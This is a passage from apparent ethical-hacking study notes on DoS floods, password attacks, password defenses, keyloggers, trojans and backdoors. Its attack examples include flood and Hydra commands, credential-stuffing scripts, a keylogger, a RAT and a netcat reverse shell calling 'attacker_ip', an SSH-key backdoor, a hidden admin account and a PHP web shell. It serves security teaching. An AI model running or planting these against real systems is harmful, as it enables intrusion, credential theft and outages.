| High | Enforce NTLMv2 | Low | Medium |
| Medium | Disable SMBv1 | Low | Medium |
| Medium | Network Segmentation | Medium | High |
| Medium | Patch Management | Medium | High |
| Low | IDS/SIEM Monitoring | High | Medium |

---

## 11. NetBIOS DoS Attacks

**NetBIOS**: legacy Windows protocol providing name resolution and session services on ports 137–139.

| Port | Protocol | Service | Function |
|---|---|---|---|
| 137 | UDP/TCP | NetBIOS Name Service (NBNS) | Name registration and resolution |
| 138 | UDP | NetBIOS Datagram Service | Broadcast communication |
| 139 | TCP | NetBIOS Session Service | Connection-oriented communication |

Deprecated in favor of DNS and SMB over TCP (445); disabled by default on Windows 10/11 but still enabled on many legacy systems.

### 11.1 Attack Methods

**Name Service Flooding (Port 137)**: flood NetBIOS name service with excessive queries, causing CPU exhaustion, memory depletion, and network congestion.
```bash
hping3 -p 137 --udp --flood <target_ip>
nbtscan -v <target_network>
```

**Session Service Flooding (Port 139)**: open many NetBIOS sessions simultaneously, exhausting the session table and causing memory leaks/instability.
```bash
for i in {1..1000}; do nc -n <target_ip> 139 & done
hping3 -p 139 --tcp --flood <target_ip>
```

**Broadcast Storm (Port 138)**: flood the NetBIOS datagram service with broadcast packets, affecting the entire network segment, not just a single target.
```bash
hping3 -p 138 --udp --bcast <target_network>
nmap -sU -p 138 --script netbios-ns <target_network>
```

**Vulnerabilities exploited**: resource exhaustion (limited connection/session tables, no rate limiting); legacy protocol issues (no authentication or validation); amplification potential (single query triggers multiple/broadcast responses).

### 11.2 Defense and Countermeasures

| Countermeasure | Implementation | Impact |
|---|---|---|
| Disable NetBIOS | Network adapter: disable NetBIOS over TCP/IP | High |
| Firewall Rules | Block ports 137-139 at network edge | High |
| Network Segmentation | Isolate legacy systems | Medium |
| Rate Limiting | Limit packets per second from a single source | Medium |
| IDS/IPS | Detect NetBIOS flood patterns | Medium |
| Update Systems | Modern Windows disables NetBIOS by default | High |

```bash
# iptables
iptables -A INPUT -p udp --dport 137:138 -j DROP
iptables -A INPUT -p tcp --dport 139 -j DROP

# Windows Firewall
netsh advfirewall firewall add rule name="Block NetBIOS" dir=in action=block protocol=UDP localport=137-138
netsh advfirewall firewall add rule name="Block NetBIOS TCP" dir=in action=block protocol=TCP localport=139
```

**Modern relevance**: still matters for legacy systems in industrial/OT environments, misconfigured modern systems, internal network attacks, and lab/learning exercises. Best practice: disable NetBIOS everywhere, use DNS for name resolution, use SMB over TCP 445, and firewall NetBIOS ports at the perimeter.

---

## 12. DDoS Attack

**DDoS**: overwhelming a target system/network with massive traffic from multiple sources (botnets, compromised devices), causing service disruption.

**Characteristics**: distributed (traffic from thousands to millions of sources); volumetric (Gbps to Tbps); automated via botnets and C2 servers; hard to mitigate by blocking individual sources; constantly evolving attack vectors.

### 12.1 Volumetric Attacks (Layer 3/4)

**Goal**: flood bandwidth with massive traffic volume, saturating the network link.

- **UDP Flood**: random UDP packets; target replies with ICMP "Destination Unreachable," saturating bandwidth. `hping3 -p 80 --udp --flood <target_ip>`
- **ICMP Flood (Ping Flood)**: overloads the target with ICMP Echo Requests, exhausting CPU/bandwidth. `hping3 -1 --flood <target_ip>`
- **DNS Amplification**: attacker sends a spoofed query (victim's IP as source) to a DNS server, which sends a large response to the victim; amplification factor 50–70x. Vector: query type ANY/TXT (large responses).

### 12.2 Protocol Attacks (Layer 3/4)

**Goal**: exploit protocol weaknesses to exhaust server resources (connections, memory, CPU) rather than raw bandwidth.

- **SYN Flood**: many fake-source SYN packets; the server sends SYN-ACK and waits, filling the connection queue and rejecting legitimate connections. `hping3 -S -p 80 --flood <target_ip>`
- **Ping of Death**: oversized ICMP packet (>65535 bytes) causing buffer overflow during fragment reassembly — mostly patched in modern systems, but legacy systems remain vulnerable.
- **Smurf Attack**: ICMP echo with a spoofed source (the victim) sent to a broadcast address; all hosts on the subnet reply to the victim, with amplification equal to the number of hosts. Defense: block directed broadcasts, disable IP-directed broadcasts, firewall ICMP at the edge.

### 12.3 Application Layer Attacks (Layer 7)

**Goal**: target specific services (HTTP, DNS, SMTP) with seemingly legitimate requests — low bandwidth but hard to distinguish from real traffic.

- **HTTP Flood (GET/POST)**: thousands of HTTP requests processed by the target (database queries, etc.) until the web server/database is exhausted. Variants: GET flood (static pages/images); POST flood (forms/API calls, more resource-intensive); randomized requests (varying User-Agent, URL, parameters).
- **Slowloris**: sends partial HTTP headers, adding a header every 10–15 seconds to keep connections open indefinitely; a few hundred connections can exhaust all server connection slots. `slowloris -s 1000 -t <target_ip> -p 80`
- **HTTP/2 Rapid Reset**: HTTP/2 streams with RST frames force the server to allocate resources per stream that are never freed (CVE-2023-44487, patched in 2023).

### 12.4 DDoS Attack Infrastructure

```
Attacker (C2 Operator) → Command & Control (C2) Server → Botnet (compromised IoT devices, servers, routers, webcams) → Target
```
**Botnet sizes**: small (hundreds–thousands); medium (10k–100k); large (100k+, e.g., Mirai: 600,000+).

**Amplification networks**: DNS servers (50–70x); NTP servers (500x); Memcached (up to 50,000x, now mostly mitigated); SSDP/UPnP (30x).

### 12.5 Notable DDoS Attacks

| Attack | Year | Target | Size | Method |
|---|---|---|---|---|
| Mirai | 2016 | DNS providers, OVH | 1+ Tbps | IoT botnet, DNS amplification |
| GitHub | 2018 | GitHub.com | 1.35 Tbps | Memcached amplification |
| Google | 2017 | Google Cloud | 2.5 Tbps | Amplification |
| AWS | 2020 | AWS customer | 2.3 Tbps | CLDAP reflection |
| Cloudflare | 2022 | Cloudflare | 26 Mpps | HTTP/2 Rapid Reset |

### 12.6 Mitigation Strategies

**Network-level**: rate limiting (`iptables -A INPUT -p tcp --dport 80 -m limit --limit 25/minute --limit-burst 100 -j ACCEPT`); blackholing (drop all traffic to the target IP as a last resort); uRPF (verify source IP against the routing table to prevent reflection).

**DDoS protection services**: Cloudflare (anycast network, automatic detection, L7 filtering); AWS Shield (Standard free / Advanced with 24/7 response team); Akamai (largest CDN/DDoS network, intelligent scrubbing). Traffic is routed through the protection network, malicious traffic is filtered at scrubbing centers, and clean traffic is forwarded to the origin.

**Application-level**: rate limiting (e.g., Nginx `limit_req_zone`); WAF (block malicious patterns, CAPTCHA challenges); load balancing and auto-scaling to distribute traffic and avoid a single point of failure.

**Incident response plan**: Detection (monitoring alerts, traffic analysis) → Mitigation (enable DDoS protection, contact ISP, rate limiting) → Communication (notify stakeholders, status page) → Recovery (restore services, analyze patterns, improve defenses).

### 12.7 Quick Reference: DDoS Attack Types

| Type | Layer | Bandwidth | Complexity | Example |
|---|---|---|---|---|
| UDP Flood | 3/4 | High | Low | Generic UDP flood |
| SYN Flood | 3/4 | Medium | Medium | Half-open connections |
| DNS Amplification | 3/4 | Very High | Medium | Spoofed DNS queries |
| HTTP Flood | 7 | Low | Medium | GET/POST requests |
| Slowloris | 7 | Very Low | High | Slow connections |
| HTTP/2 Rapid Reset | 7 | Low | High | Stream exhaustion |

---

# SESSION 12

## 1. Password-Cracking Countermeasures

Password-cracking countermeasures are defensive strategies designed to prevent or mitigate brute force, dictionary, rainbow table, and credential stuffing attacks. Effective password security requires multiple layers of defense.

### 1.1 Strong Password Policies

| Requirement | Minimum Standard | Rationale |
|---|---|---|
| Length | 12+ characters (14+ recommended) | Exponential increase in combinations |
| Uppercase/Lowercase | At least 1 each | Increases character set |
| Numbers | At least 1 digit | Adds numeric complexity |
| Symbols | At least 1 special character | Largest character-set expansion |
| No Common Words | Block dictionary words | Prevents dictionary attacks |
| No Personal Info | Block usernames, names, dates | Prevents targeted attacks |

```
# Windows Group Policy
Minimum password length: 12 characters
Password must meet complexity requirements: Enabled
Enforce password history: 24 passwords remembered
Maximum password age: 90 days

# Linux PAM (/etc/pam.d/common-password)
password requisite pam_pwquality.so retry=3 minlen=12 diligence=1
```
**Time to crack at 100 billion guesses/sec**: 8-char password ≈ 18 hours; 12-char ≈ 171 years; 14-char ≈ 1.5 million years.

**Limitations**: complexity rules can lead to predictable patterns (`Password123!`); users write down complex passwords. **Modern recommendation**: favor length over complexity — 14+ random characters, or passphrases (e.g., "Correct-Horse-Battery-Staple-42!"), plus password managers and breach-database checks.

### 1.2 Account Lockout Mechanisms

| Setting | Recommended Value | Rationale |
|---|---|---|
| Lockout Threshold | 5 failed attempts | Balance security vs. usability |
| Lockout Duration | 15–30 minutes | Deter automated attacks |
| Reset Counter | 15–30 minutes | Allow recovery |
| Admin Notification | Enabled | Alert on potential attacks |

```
# Linux faillock (/etc/security/faillock.conf)
deny = 5
unlock_time = 1800

# SSH (/etc/ssh/sshd_config)
MaxAuthTries 5
LoginGraceTime 60
```
**Limitations**: can be exploited for DoS (locking out legitimate users); distributed attacks (multiple IPs) bypass per-IP limits.
**Best practices**: progressive delays instead of hard lockout; CAPTCHA after 3–5 failures; alert admins on lockout events; combine account lockout with IP-based rate limiting.

### 1.3 Multi-Factor Authentication (MFA)

| Factor | Type | Examples | Security Level |
|---|---|---|---|
| Knowledge | Something you know | Password, PIN, security questions | Weak |
| Possession | Something you have | Smartphone, hardware token, smart card | Strong |
| Inherence | Something you are | Fingerprint, face ID, retina scan | Strongest |
| Location | Somewhere you are | GPS, IP geolocation | Medium |
| Time | Some time | Time-based OTP (TOTP) | Strong |

**Common methods**: SMS OTP (medium security); Email OTP (low-medium); TOTP App (high, e.g., Google Authenticator); Hardware Token (very high); Push Notification (high); Biometrics (very high); Smart Card (very high).

```bash
# SSH with Google Authenticator MFA
sudo apt install libpam-google-authenticator
google-authenticator -t -f -d -W -s 30
# /etc/pam.d/sshd
auth required pam_google_authenticator.so
```
**Impact**: defeats brute force, credential stuffing, and (if TOTP/hardware) most phishing (unlike SMS, which is vulnerable to SIM swapping). **Best practices**: prefer TOTP or hardware tokens over SMS; provide backup codes; use conditional access (MFA on risky logins).

### 1.4 Salting and Hashing Passwords

**Without salt (vulnerable)**: identical passwords → identical hashes → vulnerable to rainbow tables.
**With salt (secure)**: each user gets a unique random salt combined with the password before hashing, so identical passwords produce different hashes.

Salt characteristics: 16–32 bytes (128–256 bits); cryptographically secure random; unique per password; stored alongside the hash (plaintext storage of the salt is fine).

```python
import bcrypt
hashed = bcrypt.hashpw("password123".encode(), bcrypt.gensalt(rounds=12))
bcrypt.checkpw("password123".encode(), hashed)
```
```php
$hash = password_hash($password, PASSWORD_BCRYPT, ['cost' => 12]);
password_verify($password, $hash);
```
**Why salting works**: rainbow tables become useless (would need a table per possible salt); identical passwords produce different hashes; each hash must be cracked individually.

### 1.5 Use of Slow Hash Functions

| Algorithm | Speed (RTX 3080) | Recommended for Passwords? |
|---|---|---|
| MD5 | 50+ billion/sec | ❌ Never |
| SHA-1 | 25+ billion/sec | ❌ Never |
| SHA-256 | 10+ billion/sec | ❌ Never |
| PBKDF2 | 100k/sec | ⚠️ Acceptable with high iterations |
| SHA-512crypt | 50k/sec | ⚠️ Acceptable with high iterations |
| bcrypt | 10k/sec | ✅ Recommended |
| scrypt | 1k/sec | ✅ Recommended (memory-hard) |
| Argon2 | 500/sec | ✅ Best (PHC winner) |

**bcrypt**: adaptive cost factor, built-in salt, resistant to GPU/ASIC attacks — industry standard. **scrypt**: memory-intensive, defeats ASIC/GPU attacks, configurable CPU/memory cost. **Argon2 (winner of the 2015 Password Hashing Competition)**: memory-hard and CPU-hard, resistant to GPU/ASIC/side-channel attacks; variants Argon2d, Argon2i, and Argon2id (recommended hybrid). **PBKDF2**: NIST standard (FIPS 198), widely supported, but more GPU-accelerable than bcrypt/scrypt/Argon2.

```python
from argon2 import PasswordHasher
ph = PasswordHasher(time_cost=3, memory_cost=65536, parallelism=4, hash_len=32)
hashed = ph.hash("password123")
ph.verify(hashed, "password123")
```
**Recommendations**: new systems → Argon2id; existing systems → bcrypt; compliance-driven → PBKDF2; never MD5/SHA-1/plain SHA-256. Tune the cost factor to achieve 250–500ms per hash, and re-evaluate as hardware improves.

### 1.6 Monitoring and Alerting

| Metric | Threshold | Alert Level | Response |
|---|---|---|---|
| Failed Logins per User | >5 in 5 min | Medium | Account lockout |
| Failed Logins per IP | >50 in 5 min | High | IP block |
| Failed Logins Globally | >500 in 5 min | Critical | DDoS investigation |
| Successful Login after Failures | Any | High | Investigate compromise |
| Login from New Location | Unusual geolocation | Medium | MFA challenge |

**Detection patterns**: brute force (>100 failed logins from a single IP in 5 min → block IP); credential stuffing (failed logins for many users from one IP → block IP, check for compromised accounts); distributed attack (failed logins from many IPs targeting one user → implement MFA); password spray (single password tried across many users → reset affected accounts).

Tools/approach: ELK stack (Elasticsearch/Logstash/Kibana) for log analysis; Suricata/Splunk SIEM rules for automated alerting; custom scripts monitoring auth logs for threshold breaches.

**Best practices**: real-time monitoring, not just log review; automated alerts and response (IP blocking, lockout); SIEM correlation across systems; regularly tune thresholds to reduce false positives.

### 1.7 Limit Password Reuse

| Setting | Recommended Value | Rationale |
|---|---|---|
| Password History | Remember 12–24 passwords | Prevent cycling through a few passwords |
| Maximum Password Age | 60–90 days | Limit exposure window if compromised |
| Minimum Password Age | 1–3 days | Prevent immediate cycling |
| Change Notification | 14 days before expiry | Ensure timely change |

```
# Linux PAM
password requisite pam_pwhistory.so use_authtok remember=24
# /etc/login.defs
PASS_MAX_DAYS   90
PASS_MIN_DAYS   1
PASS_WARN_AGE   14
```

**Modern Best Practices (NIST 800-63B)**

| Traditional Approach | Modern Recommendation |
|---|---|
| Change every 90 days | Change only if compromised or suspected |
| Complexity requirements | Length-focused (12+ chars), no forced complexity |
| Password history (24) | Block known breached passwords instead |
| Maximum age: 90 days | No maximum age (if password is strong) |

**Rationale**: forced periodic changes lead to weak, predictable passwords (Password1 → Password2...) and users writing them down. The modern approach favors strong passwords + MFA + breach monitoring over forced rotation.

```python
import hashlib, requests
def check_password_breach(password):
    sha1_hash = hashlib.sha1(password.encode()).hexdigest().upper()
    prefix, suffix = sha1_hash[:5], sha1_hash[5:]
    response = requests.get(f"https://api.pwnedpasswords.com/range/{prefix}")
    for line in response.text.splitlines():
        hash_suffix, count = line.split(':')
        if hash_suffix == suffix:
            return f"Password seen in {count} breaches. Do not use."
    return "Not found in known breaches."
```

---

## 2. Active and Passive Online Attacks

Online password attacks are categorized by the attacker's interaction with the target: **active** attacks interact directly with the authentication system in real time; **passive** attacks eavesdrop or monitor without direct interaction.

### 2.1 Active Online Attacks

**Characteristics**: direct interaction (sends real login requests); detectable (leaves logs, can trigger alerts); rate-limited by network/target response time; risk of triggering lockouts.

**1. Online Brute Force** — try password after password until success or lockout.
```bash
hydra -l admin -P rockyou.txt ssh://192.168.1.10
hydra -l admin -P rockyou.txt 192.168.1.10 http-post-form "/login:username=^USER^&password=^PASS^:Invalid password"
```
Tools: THC-Hydra, Medusa, Ncrack. Speed: typically 1–10 attempts/sec per connection (10–100/sec parallel). Countermeasures: lockout, rate limiting/CAPTCHA, MFA.

**2. Online Dictionary Attack** — same mechanism but with a wordlist for a faster, higher success rate against weak passwords.
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10
hydra -l Administrator -P rockyou.txt rdp://192.168.1.10
```

**3. Credential Stuffing** — test known leaked username/password pairs against a target service, exploiting password reuse (50–60% of users reuse passwords).
```python
import requests
credentials = [('user1@example.com', 'password123'), ('user2@example.com', 'admin456')]
for email, password in credentials:
    response = requests.post('https://target.com/login', data={'email': email, 'password': password})
    if 'Welcome' in response.text or 'Dashboard' in response.text:
        print(f"Success: {email}:{password}")
```
Tools: SNIPR, OpenBullet. Detection: logins from many different IPs; successful logins from unusual locations. Countermeasures: MFA, breach monitoring, rate limiting, behavioral analysis.

**4. Password Spraying** — try a single common password against many usernames (reverse of brute force), avoiding lockouts by limiting attempts per account.
```python
users = ['admin', 'john.doe', 'jane.smith']
password = "Password123!"
for user in users:
    response = requests.post('https://target.com/login', data={'username': user, 'password': password})
```
Common sprayed passwords: seasonal (`Spring2024!`), company-specific, or default (`Welcome123!`). Detection: many users with a single failed attempt from one IP — requires cross-user correlation. Countermeasures: block common passwords, MFA, SIEM correlation, user training.

**5. Hybrid Online Attacks** — dictionary + mutations, more effective than pure dictionary and faster than brute force.
```bash
hydra -l admin -P rockyou.txt -e 'n' ssh://192.168.1.10
hashcat -a 0 hash.txt rockyou.txt -r rules/best64.rule
```

### 2.2 Passive Online Attacks

**Characteristics**: no direct interaction — passively monitors network traffic; stealthy and largely undetectable by the target; captured data analyzed offline; not limited by rate limits.

**1. Packet Sniffing / Eavesdropping** — capture unencrypted credentials from protocols like HTTP, FTP, Telnet, or SMTP/POP3/IMAP without TLS.
```bash
tcpdump -i eth0 -A 'tcp port 80'
dsniff -i eth0
```
Wireshark filters: `http.request.method == "POST"`, `http.authorization contains "Basic"`, `ftp.request.command == "PASS"`.
Defense: encryption everywhere (HTTPS, FTPS, SSH, TLS); network segmentation; VPN.

**2. Man-in-the-Middle (MITM)** — position between victim and server to intercept traffic.
- **ARP Spoofing**: `arpspoof -i eth0 -t <victim_ip> <gateway_ip>`
- **DNS Spoofing**: `dnsspoof -i eth0 target.com`
- **SSL Stripping**: downgrades HTTPS to HTTP so credentials are sent in plaintext.

Tools: BetterCAP, Ettercap, MITMf, SSLstrip. Defense: HTTPS Everywhere, HSTS, certificate pinning, network monitoring for ARP spoofing patterns.

**3. Session Hijacking** — steal session tokens/cookies to impersonate an already-authenticated user without needing the password.
```bash
curl -H "Cookie: session_id=abc123xyz789" https://target.com/dashboard
```
Defense: HTTPS; `Secure; HttpOnly; SameSite=Strict` cookie flags; short session timeouts; session binding to IP/user-agent/device fingerprint.

**4. Traffic Analysis** — infer sensitive information from traffic metadata (timing, size, patterns) without decrypting content, e.g., large outbound transfers at odd hours suggesting data exfiltration. Defense: traffic padding, timing obfuscation, encryption, VPN/Tor.

**5. Keylogging** — capture keystrokes (including passwords) directly from the victim's machine, requiring no network interaction (see Section 4 below for full detail).

### 2.3 Active vs. Passive — Comparison

| Characteristic | Active Attacks | Passive Attacks |
|---|---|---|
| Interaction | Direct (sends requests) | Indirect (monitors traffic) |
| Detectability | High (logs, alerts) | Low (no logs on target) |
| Risk | Can trigger defenses | Largely undetectable |
| Speed | Slow (rate-limited) | Fast (no rate limits) |
| Tools | Hydra, Medusa, scripts | Wireshark, tcpdump, dsniff |
| Defense | Lockout, rate limiting, MFA | Encryption, network security |
| Examples | Brute force, dictionary, credential stuffing | Sniffing, MITM, session hijacking |

---

## 3. Offline Attacks

Offline attacks occur when an attacker obtains password hashes (via breach, database theft, or system compromise) and cracks them using their own computing resources, independent of the target system.

**Why Offline Attacks Are More Dangerous**

| Factor | Online Attacks | Offline Attacks |
|---|---|---|
| Detection | Logged, can trigger alerts | No detection on target system |
| Rate Limiting | Limited by network/target response | Unlimited (constrained only by attacker hardware) |
| Account Lockout | Can trigger after 5–10 attempts | No lockout (hashes already stolen) |
| Time Constraints | Limited by target availability | Can run for days, weeks, months |
| Parallelization | Limited by target capacity | Can use thousands of GPUs |
| Success Rate | Low (defenses in place) | Higher (no defenses during the attack) |

### 3.1 Attack Process
```
1. Reconnaissance and Access
2. Obtain Password Database (SQLi, breach, physical access, malware)
3. Extract Password Hashes (SAM dump, /etc/shadow, DB dump)
4. Identify Hash Type (HashID, hash-identifier)
5. Choose Attack Method (dictionary, hybrid, brute force, rainbow tables)
6. Execute Cracking (Hashcat, John the Ripper, GPU clusters)
7. Analyze Results and use cracked passwords for further attacks
```

### 3.2 Hash Extraction by System

**Windows**: SAM file (`pwdump8.exe`, Mimikatz, Meterpreter `hashdump`) or Active Directory's `NTDS.dit` (via Volume Shadow Copy or `ntdsutil`), extracted with tools like libesedb or ntdsxtract.

**Linux**: `/etc/shadow` (requires root); combine with `/etc/passwd` using `unshadow`. Hash prefixes: `$1$` MD5, `$2a$`/`$2b$` bcrypt, `$5$` SHA-256, `$6$` SHA-512 (most common on modern Linux).

**Databases**: MySQL (`mysql.user.authentication_string`); PostgreSQL (`pg_authid.rolpassword`, MD5 or SCRAM-SHA-256); Oracle (`sys.user$.password`).

### 3.3 Offline Attack Tools

**Hashcat** — GPU-accelerated, 300+ hash types, multiple attack modes.

| Mode | Type | Description |
|---|---|---|
| 0 | Dictionary | Wordlist attack (fastest) |
| 1 | Combination | Wordlist A + Wordlist B |
| 3 | Brute Force | All character combinations (slowest) |
| 6 | Hybrid Wordlist+Mask | Dictionary + suffix |
| 7 | Hybrid Mask+Wordlist | Prefix + dictionary |

```bash
hashcat -m 0 -a 0 hashes.txt rockyou.txt                 # MD5 dictionary
hashcat -m 1000 -a 3 hashes.txt '?a?a?a?a?a?a?a?a'        # NTLM brute force
hashcat -m 2500 -a 6 wpa-handshake.cap rockyou.txt '?d?d?d?d'  # WPA2 hybrid
hashcat -m 0 -a 0 hashes.txt rockyou.txt -r rules/best64.rule  # rule-based
```
Performance (RTX 3080): MD5 50+B/s, SHA-1 25+B/s, NTLM 30+B/s, WPA2 500k/s, bcrypt 10k/s.

**John the Ripper** — CPU-based, auto-detects hash types, versatile rule-based attacks.
```bash
john hashes.txt                                # auto-detect
john --wordlist=rockyou.txt hashes.txt
john --incremental=All hashes.txt              # brute force
john --show hashes.txt
```

**Rainbow Tables** — precomputed hash→password lookups, O(1) instant lookup, but useless against salted hashes.

| Hash Type | Password Length | Table Size |
|---|---|---|
| LM | 7 chars | 1.4 GB |
| NTLM | 8 chars | 600 GB |
| MD5/SHA-1 | 10 chars | Multiple TB |

```bash
rtgen md5 loweralpha 1 7 0 1800 35000000 all
rtcrack md5_loweralpha-1-7-0-1800-35000000-all.rt hash.txt
```
Ineffective against modern systems that use salting and slow hash functions (bcrypt, Argon2).

### 3.4 Real-World Data Breaches

| Breach | Year | Records | Hash Type | Impact |
|---|---|---|---|---|
| LinkedIn | 2012 | 164M | SHA-1 (unsalted) | 6.5M cracked in hours |
| Adobe | 2013 | 153M | 3DES (weak) | Most cracked quickly |
| Yahoo | 2013–14 | 3B | MD5 (unsalted) | Billions compromised |
| Collection #1 | 2019 | 773M | Various | 21M unique passwords |
| Facebook | 2019 | 419M | Plaintext | Stored in plaintext |

### 3.5 Defense Against Offline Attacks

| Defense | Mechanism | Effectiveness |
|---|---|---|
| Salting | Unique random salt per password | ★★★★★ (defeats rainbow tables) |
| Slow Hash Functions | bcrypt, scrypt, Argon2 | ★★★★★ (slows cracking to years) |
| Long Passwords | 14+ characters | ★★★★☆ |
| MFA | Password alone insufficient | ★★★★★ (offline attack irrelevant) |
| Breach Monitoring | HaveIBeenPwned | ★★★★☆ |

Best practices: Argon2id or bcrypt with appropriate cost; unique 16–32 byte salt per password; minimum 12–14 character passwords; MFA; never store plaintext passwords.

---

## 4. Keyloggers and Other Spyware Technologies

Keyloggers and spyware are malicious technologies that covertly capture sensitive information directly on the victim's device.

### 4.1 Keyloggers

**Hardware Keyloggers**: physical devices (USB, PS/2, wireless intercept, modified firmware) placed between the keyboard and computer — undetectable by anti-malware, but require physical access to install/retrieve. Defense: physical security, inspect USB ports, virtual/onscreen keyboards.

**Software Keyloggers**: malware installed on the victim's system, running hidden in the background, logging keystrokes to a file or exfiltrating them to the attacker. Can also capture screenshots, clipboard content, and audio. Installed via phishing, malicious downloads, trojans, unpatched exploits, or USB drop attacks.
```python
from pynput import keyboard
def on_press(key):
    with open("keylog.txt", "a") as f:
        f.write(str(key))
keyboard.Listener(on_press=on_press).join()
```
Detection: anti-malware scanning, process monitoring, network traffic analysis, startup program inspection.

**Kernel-Level Keyloggers**: rootkit-level, operating in kernel mode (highest privilege), extremely difficult to detect — can bypass user-mode anti-malware via kernel modules, driver IRP hooks, or syscall hooking. Detection: kernel integrity checking (SELinux, AppArmor), rootkit scanners (chkrootkit, rkhunter), Secure Boot.

**Acoustic/Power-Analysis Keyloggers**: research-grade techniques that infer keystrokes from typing sound (>90% accuracy in lab conditions) or keyboard power draw. Defense: soundproofing, randomized typing, white noise.

### 4.2 Screen Scrapers

- **Screenshot Capture**: periodic screenshots capturing visible passwords or sensitive documents.
- **Screen Recording**: continuous video capture of the desktop (e.g., video calls, meetings).
- **OCR-Based Extraction**: apply optical character recognition to screenshots to identify passwords or card numbers via pattern matching.

Defense: privacy screens, minimizing sensitive apps when idle, password managers (no typing needed), anti-malware.

### 4.3 Form Grabbers

**Definition**: capture data entered into web forms and login pages *before* it's encrypted and submitted.

**Flow**: user types a password into a login form → the form grabber intercepts the input field → captures the data before submission → sends it to the attacker → the form submits normally, so the user is unaware.

**Implementation methods**: malicious browser extensions intercepting form data; malicious Browser Helper Objects (legacy IE); API hooking via browser process injection.

Capabilities: capture usernames/passwords, credit card info, and personal data — effectively bypassing HTTPS since data is captured before encryption.

Defense: avoid untrusted browser extensions; use password managers (auto-fill, no typing); anti-malware; review installed extensions regularly; enforce HTTPS-only browsing.

### 4.4 Spyware Installation Methods

**Phishing Emails**: urgent subject line → malicious attachment (Word/PDF/Excel with macros) → user opens it and enables macros → malware installs silently → captured data uploaded to the attacker.

**Malicious Downloads**: pirated software, "free" paid-software versions, fake updates (Flash/Java), fake antivirus, adult content sites. Defense: download only from official sources, verify file hashes, scan before executing.

**Trojans**: malware disguised as legitimate software (see Section 5 below for full detail on types and infection process).

### 4.5 Defense Against Keyloggers and Spyware

| Defense | Implementation | Effectiveness |
|---|---|---|
| Anti-Malware | Windows Defender, Malwarebytes, Kaspersky | ★★★★☆ |
| Regular Scanning | Weekly scans, real-time protection | ★★★★☆ |
| Keep Software Updated | Patch OS, browsers, apps | ★★★★☆ |
| Avoid Suspicious Downloads | Official sources only | ★★★★★ |
| Email Security | No attachments from unknown senders | ★★★★☆ |
| Password Managers | Auto-fill, no typing | ★★★★☆ |
| MFA | Defeats captured passwords | ★★★★★ |
| Virtual Keyboards | Bypass hardware keyloggers | ★★★☆☆ |
| Physical Security | Prevent unauthorized physical access | ★★★★★ |

---

## 5. Trojans and Backdoors

**Trojans** disguise themselves as legitimate software to gain initial access; **backdoors** are hidden access points (which may be installed by a trojan) left to maintain persistent access and bypass normal authentication.

### 5.1 Trojans (Trojan Horses)

**Definition**: malware disguised as legitimate software that, when executed, allows attackers unauthorized access. Named after the Greek mythological deceptive gift.

**Characteristics**: deception (appears legitimate — game, utility, document); requires user execution; delivers a payload (keylogger, RAT, ransomware); persistence (adds to startup/registry/services); stealth; often includes C2 for remote access.

### 5.2 Types of Trojans

**1. Remote Access Trojan (RAT)**
- *Capabilities*: full remote control; file transfer; keylogging/screen capture; webcam/microphone access; command execution; spreading to other systems.
- *Popular RATs*: DarkComet, BlackShades, njRAT, QuasarRAT, Cobalt Strike (legitimate pentest tool, often abused).
```python
# Simplified RAT structure (educational)
import socket, subprocess
s = socket.socket(); s.connect(("attacker_ip", 4444))
while True:
    command = s.recv(1024).decode()
    if command.lower() == "exit": break
    result = subprocess.run(command, shell=True, capture_output=True)
    s.send(result.stdout + result.stderr)
```

**2. Banking Trojan** — steals financial information (banking credentials, cards, crypto).
- *Popular*: Emotet, TrickBot, Dridex, Zeus (Zbot), QakBot.
- *Techniques*: web injects (modifying banking pages to capture credentials); form grabbing; man-in-the-browser; VNC injection overlaying fake forms.
- Defense: use official banking apps, enable MFA, monitor account activity, use a dedicated device for banking, type URLs manually.

**3. Downloader Trojan** — a minimal initial infection that downloads and installs further malware (ransomware, keylogger, RAT, cryptominer) from a C2 server.

**4. Ransomware Trojan** — encrypts files and demands payment for decryption.
- *Popular*: WannaCry (2017, via EternalBlue/SMB), Ryuk, Conti (RaaS), LockBit (RaaS), BlackCat/ALPHV (Rust-based).
- *Process*: infect → disable backups/shadow copies → generate encryption keys (AES-256 + RSA) → encrypt files → leave a ransom note → demand cryptocurrency payment.
- Defense: regular offline/immutable backups; patch SMB/RDP; disable Office macros; email filtering; network segmentation; never pay the ransom.

**5. Cryptomining Trojan** — hijacks the victim's CPU/GPU to mine cryptocurrency (e.g., XMRig for Monero). Symptoms: high CPU usage, overheating, system slowdown, unusual mining-pool network traffic.

### 5.3 Trojan Infection Process
```
1. Delivery (phishing, malicious download, exploit kit, USB drop)
2. Execution (user runs the file / macro / exploit auto-runs)
3. Installation (copies itself, adds registry Run key, scheduled task/service, disables security software)
4. Command and Control (contacts C2 server, receives commands, uploads system info)
5. Payload Execution (downloads more malware, steals data, spreads laterally)
6. Persistence (survives reboots, uses rootkit techniques, multiple backdoors, dormant reinstall copies)
```

### 5.4 Backdoors

**Definition**: hidden access points left by attackers to bypass normal authentication and re-enter a system later.

**Physical Backdoors**: hidden admin accounts; hardware implants; modified firmware/BIOS/UEFI.
```bash
net user backdoor$ Password123! /add
net localgroup administrators backdoor$ /add
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v backdoor$ /t REG_DWORD /d 0
```

**Network Backdoors**: listening ports; reverse shells; SSH/HTTP tunnels for covert access.
```bash
# Netcat listener/reverse shell
nc -lvnp 4444
nc attacker_ip 4444 -e /bin/bash

# SSH key backdoor
echo "attacker_public_key" >> /home/user/.ssh/authorized_keys
```

**Software Backdoors**: modified legitimate binaries; web shells; malicious scheduled tasks; malicious services disguised as legitimate ones.
```php
<?php if (isset($_GET['cmd'])) { echo "<pre>"; system($_GET['cmd']); echo "</pre>"; } ?>
<!-- Usage: http://victim.com/shell.php?cmd=whoami -->
```

**Cryptographic Backdoors**: hardcoded encryption keys; weak/predictable random number generators; deliberately weak crypto implementations, letting the attacker decrypt data without the user's password.

**Compiler Backdoors**: a malicious compiler inserts backdoors into compiled programs and even into future compiler builds (Ken Thompson's classic 1984 "Reflections on Trusting Trust"). Modern relevance: supply-chain attacks (XcodeGhost 2015, CCleaner breach 2017).

### 5.5 Reverse-Connecting Trojans

**Concept**: instead of the attacker connecting *to* an open port on the victim (which firewalls typically block inbound), the **compromised machine initiates an outbound connection back to the attacker's listener**. Outbound connections are far more likely to be allowed by firewalls, making this the dominant technique in modern trojans and RATs.

